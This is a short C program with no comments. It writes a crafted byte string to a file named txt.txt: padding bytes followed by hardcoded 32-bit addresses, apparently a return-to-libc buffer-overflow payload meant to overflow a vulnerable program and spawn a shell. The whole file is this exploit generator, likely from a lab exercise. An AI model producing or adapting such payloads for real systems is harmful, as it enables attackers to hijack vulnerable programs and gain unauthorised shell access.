#include <stdio.h>
#include <string.h>

int main()
{
	int i = 0;
	char a[100]= "\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\xa0\x2d\xe4\xb7\xd0\x69\xe3\xb7\xab\x39\xf6\xb7";
	
	char shell[500] = "";
	strcat(a,shell);
	FILE *fp = fopen("txt.txt", "w+");
	fwrite(a,sizeof(char),strlen(a),fp);
	fclose(fp);
	
	return 0;
}
